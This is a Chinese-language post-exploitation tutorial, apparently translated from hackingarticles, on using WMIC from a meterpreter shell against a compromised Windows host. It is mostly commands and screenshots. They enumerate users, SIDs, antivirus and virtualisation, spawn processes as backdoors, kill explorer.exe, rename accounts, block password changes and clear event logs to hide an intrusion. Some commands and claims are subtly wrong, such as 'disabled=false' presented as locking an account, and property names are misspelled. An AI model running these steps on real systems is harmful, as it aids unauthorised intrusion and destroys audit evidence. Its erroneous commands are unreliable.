## 写在前面的话

 **在这篇文章中，我们将讨论如何在攻击的后渗透利用阶段使用WMIC（Windows Management InstrumentationCommand
Line）。当攻击者在远程PC上拿到meterpreter会话之后，他们就可以枚举大量的系统信息，并利用WMI命令行工具来进行更深程度的操作。**

首先，我们会介绍如何拿到远程PC的meterpreter会话。拿到会话之后，我们还会告诉大家如何提权至管理员权限。

WMIC命令行可以通过Windows CMD来访问，直接在meterpreter
shell中输入“shell“即可。接下来，我们一起看一看WMIC命令以及相应的工作机制。

## WMIC

下面这个命令可以查看WMIC命令的全局选项，WMIC全局选项可以用来设置WMIC环境的各种属性，通过结合各种全局选项以及参数，我们就可以通过WMIC环境来管理整个系统了。

    
    
    wmic /?

![2.png](https://image.3001.net/images/20180829/1535531011_5b86580341451.png!small)

## 获取系统角色、用户名和制造商

铜鼓WMIC命令的操作系统指令，我们可以枚举出大量关于目标系统的信息，包括主机名、域名、制造商以及设备型号等等。

我们还可以添加下列过滤器来获取更精准的扫描结果：

Roles：它可以给我们提供目标设备在整个网络系统中所扮演的角色，例如工作站、服务器或个人PC等等。

Manufacturer：它可以给我们提供目标系统的制造商和设备型号，因为某些特定制造商所生产的特定型号设备会存在特定的漏洞，因此我们可以利用这部分信息来寻找存在漏洞的设备。

UserName：它可以给我们返回系统的用户名，我们可以利用这部分信息来区分谁是管理员谁是普通用户。

[/format:list]：以列表格式输出数据并排列。

    
    
    wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list

![3.png](https://image.3001.net/images/20180829/1535531039_5b86581f974df.png!small)

### 获取SID

为了枚举出SID，我们需要用到WMIC的group选项：

    
    
    wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status

如下图所示，我们已经查找到了账户名、域名、本地组成员状态、SID以及相应的状态：

![4.png](https://image.3001.net/images/20180829/1535531057_5b86583150809.png!small)

### 创建一个进程

WMIC命令的process选项可以帮助我们在目标用户的系统中创建各种进程。这种功能可以帮助我们创建后门，或占用大量目标系统的内存：

    
    
    wmic process call create “[Process Name]”
    
    wmic process call create “taskmgr.exe”

你可以从下图中看到，这个命令不仅会创建一个进程，而且还会赋予相应的进程ID，所以我们就可以根据我们的需要来修改进程信息了。

![5.png](https://image.3001.net/images/20180829/1535531071_5b86583f18ca7.png!small)

注意：如果进程创建了一个类似任务管理器和CMD这样的窗口，那么这条命令将会在目标系统中打开这个窗口，这样会引起目标用户的怀疑。

### 修改进程优先级

WMIC命令的process选项还可以帮我们修改目标系统中运行进程的优先级，这是一个非常有用的功能。降低某个进程的优先级可能会导致特定的应用程序发生崩溃，而提升某个进程的优先级甚至还会导致整个系统发生崩溃。

    
    
    wmic process where name=”explorer.exe” call set priority 64

![6.png](https://image.3001.net/images/20180829/1535531151_5b86588f723bd.png!small)

### 终止进程

WMIC命令还可以帮我们终止目标系统正在运行的进程：

    
    
    wmic process where name=”explorer.exe” call terminate

![7.png](https://image.3001.net/images/20180829/1535531173_5b8658a58f524.png!small)

### 获取可执行文件列表

下面的命令可以枚举出整个系统中所有可执行文件的路径地址：

    
    
    wmic process where “NOT ExecutablePath LIKE ‘%Windows%’” GET ExecutablePath

![8.png](https://image.3001.net/images/20180829/1535531192_5b8658b81ab08.png!small)

### 获取目录属性

WMIC命令的fsdir选项可以提取目标系统中文件目录的基本信息，其中包括压缩方法、创建日期、文件大小、是否可读写、是否为系统文件、加密状态以及加密类型等等：

    
    
    wmic fsdir where=”drive=’c:’ and filename=’test’” get /format:list’

![9.png](https://image.3001.net/images/20180829/1535531225_5b8658d994d56.png!small)

### 获取文件属性

WMIC命令的datafile选项可以获取目标系统中文件的基本信息，其中包括压缩方法、创建日期、文件大小、是否可读写、是否为系统文件、加密状态以及加密类型等等：

    
    
    wmic datafile where=’[Path of File]’ get /format:list
    
    wmic datafile where name=’c:\\windows\\system32\\demo\\demo.txt’ get /format:list

![10.png](https://image.3001.net/images/20180829/1535531384_5b86597810b4d.png!small)

### 定位系统文件

WMIC可以提取出所有重要系统文件的路径，例如temp目录和win目录等等：

    
    
    wmic environment get Description, VariableValue

![11.png](https://image.3001.net/images/20180829/1535531409_5b8659914d37a.png!small)

### 获取已安装的应用程序列表

    
    
    wmic product get name

![12.png](https://image.3001.net/images/20180829/1535531433_5b8659a9c91b9.png!small)

### 获取正在运行的服务列表

获取到正在运行的服务列表之后，WMIC还可以提供服务的启动模式，例如“自动”、“手动”和“运行中”：

    
    
    wmic service where (state=”running”) get caption, name, startmode

![13.png](https://image.3001.net/images/20180829/1535531460_5b8659c41a08d.png!small)

### 获取系统驱动详情

sysdrive选项可以枚举出驱动的名称、路径和服务类型等数据：

    
    
    wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list

![14.png](https://image.3001.net/images/20180829/1535531485_5b8659dd5f841.png!small)

### 获取操作系统详情

os选项可以列举出目标系统的上一次启动时间、注册的用户数量、处理器数量、物理/虚拟内存信息和安装的操作系统类型等等：

    
    
    wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, LastBootUpdate,NumberofProcesses, NumberofUsers, Organization, RegisteredUsers, Status/format:list

![15.png](https://image.3001.net/images/20180829/1535531511_5b8659f754b0e.png!small)

### 获取主板信息和BIOS序列号

    
    
    wmic baseboard, get Manufacturer, Product, SerialNumber, Version

![16.png](https://image.3001.net/images/20180829/1535531526_5b865a06b3ca0.png!small)

    
    
    wmic bios, get serialNumber

![17.png](https://image.3001.net/images/20180829/1535531592_5b865a48c7ecd.png!small)

### 获取内存缓存数据

memcache选项可以获取到内存缓存名和块大小等信息：

    
    
    wmic memcache get Name, BlockSize, Purpose, MaxCacheSize, Status

![18.png](https://image.3001.net/images/20180829/1535531625_5b865a697cff9.png!small)

### 获取内存芯片信息

memorychip选项可以获取到RAM的相关信息，例如序列号等等：

    
    
    wmic memorychip get PartNumber, SerialNumber

![19.png](https://image.3001.net/images/20180829/1535531683_5b865aa34821d.png!small)

### 判断目标系统是否为虚拟机

我们可以根据onboarddevice选项返回的信息来判断目标系统到底是真实的主机操作系统，还是一台虚拟机（VMware或Virtual Box）：

    
    
    wmic onboarddevice get Desciption, DeviceType, Enabled, Status /format:list

![20.png](https://image.3001.net/images/20180829/1535531708_5b865abcd44c9.png!small)

## 用户账号管理

### 锁定用户账号

我们可以使用useraccount选项来锁定本地用户账号：

    
    
    wmic useraccount where name=’demo’ set disabled=false

![21.png](https://image.3001.net/images/20180829/1535531837_5b865b3d650e5.png!small)

### 用户账号重命名

    
    
    wmic useraccount where name=’demo’ rename hacker

![22.png](https://image.3001.net/images/20180829/1535531860_5b865b545a483.png!small)

### 限制用户修改密码

我们还可以限制本地用户的密码修改操作：

    
    
    wmic useraccount where name=’hacker’ set passwordchangeable=false

![23.png](https://image.3001.net/images/20180829/1535531882_5b865b6ac4473.png!small)

### 获取反病毒产品详情

我们可以枚举出目标系统安装的反病毒产品信息，包括安装位置和版本：

    
    
    wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe

![24.png](https://image.3001.net/images/20180829/1535531917_5b865b8dc4e81.png!small)

### 清理系统日志

WMIC命令的nteventlog选项还可以清除系统的日志记录，当你入侵了某个系统之后，这个命令可以帮助你掩盖攻击痕迹：

    
    
    wmic nteventlog where filename='[logfilename]’ cleareventlog
    
    wmic nteventlog where filename=’system’ cleareventlog

![25.png](https://image.3001.net/images/20180829/1535531937_5b865ba1c81f6.png!small)

 ***参考来源：[hackingarticles](http://www.hackingarticles.in/post-exploitation-using-wmic-system-command/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

